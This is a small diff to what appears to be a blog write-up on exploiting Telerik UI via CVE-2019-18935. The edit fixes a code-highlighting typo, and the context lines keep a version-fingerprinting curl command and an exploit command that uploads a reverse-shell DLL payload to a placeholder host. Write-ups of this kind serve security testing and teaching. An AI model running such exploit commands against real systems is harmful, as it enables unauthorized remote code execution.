@@ -31,7 +31,7 @@ Ok, at this point I was sure Telerik was actually implemented, but I was not tha
 
 &nbsp;
 
-{% highlight shell lineos %}
+{% highlight shell linenos %}
 curl -skL <HOST> | grep -oE '20[0-9]{2}(\.[0-9]*)+'
 {% endhighlight %}
 
@@ -77,7 +77,7 @@ and I ended up with two different payloads, _sleep-XXXXXXXXXXXXX-amd64.dll_ and 
   
  &nbsp; 
   
-{% highlight shell lineos %}
+{% highlight shell linenos %}
 python3 CVE-2019-18935.py -v 2017 -p payloads/reverse-shell-XXXXXXXXXXXXXX-amd64.dll -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau
 {% endhighlight %}
   
